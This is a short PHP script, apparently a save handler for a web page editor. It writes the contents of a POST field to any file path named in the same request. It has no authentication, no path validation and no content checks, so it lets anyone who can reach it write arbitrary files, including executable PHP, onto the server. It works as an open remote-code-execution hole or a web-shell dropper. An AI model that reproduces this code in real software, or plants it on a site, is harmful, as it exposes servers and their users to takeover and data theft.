<?php
if(isset($_POST["action"]) && $_POST["action"] ==="save"&&  isset($_POST["html"]) &&  isset($_POST["path"])) {
    $rfile = fopen($_POST["path"],'w');
    fwrite($rfile,$_POST["html"]);
    fclose($rfile);
    echo "ok";
}

